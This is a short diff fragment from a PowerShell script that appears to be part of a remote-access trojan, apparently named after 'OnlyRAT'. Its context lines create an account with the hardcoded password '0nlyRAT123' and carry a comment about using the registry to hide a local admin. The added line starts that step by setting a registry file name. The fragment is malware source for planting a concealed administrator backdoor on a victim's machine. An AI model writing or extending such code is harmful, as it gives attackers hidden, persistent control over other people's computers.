@@ -26,6 +26,7 @@ $xf061pass = (ConvertTo-SecureString "0nlyRAT123" -AsPlainText -Force)
 create_account -xf061name $xf061name -xf061pass $xf061pass
 
 # registry to hide local admin
+$reg_file = random_text
 
 
 
